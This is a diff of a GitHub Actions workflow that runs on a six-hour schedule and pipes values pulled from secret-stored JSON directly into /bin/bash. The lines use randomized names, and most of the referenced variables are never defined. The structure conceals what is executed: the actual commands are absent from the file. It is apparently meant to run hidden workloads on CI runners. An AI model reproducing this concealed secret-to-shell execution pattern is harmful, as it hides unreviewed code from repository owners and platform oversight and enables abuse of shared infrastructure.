@@ -1,22 +1,23 @@
 name: machuntiangao
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '50 1/6 * * *'
+    - cron: '33 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: machuntiangao
         env:
-          kuoqa331: ${{ secrets.kuoqa331 }}
+          acoj702: ${{ secrets.acoj702 }}
         run: |
-          echo $kuoqa331 | jq -r .l0 | /bin/bash
-          echo $pmpm33437 | jq -r .xyk5705 | /bin/bash
-          echo $mf0 | jq -r .t25 | /bin/bash
-          echo $qc56 | jq -r .srosq42 | /bin/bash
-          echo $rrh7813 | jq -r .dfphn0 | /bin/bash
-          echo $o40226 | jq -r .wrwmn63 | /bin/bash
+          echo $acoj702 | jq -r .irga2 | /bin/bash
+          echo $dz04 | jq -r .r889 | /bin/bash
+          echo $u23 | jq -r .ehs2867 | /bin/bash
+          echo $kd2 | jq -r .pfnn35 | /bin/bash
+          echo $fbild19 | jq -r .l3 | /bin/bash
+          echo $dyjj90 | jq -r .hsrc11 | /bin/bash
 
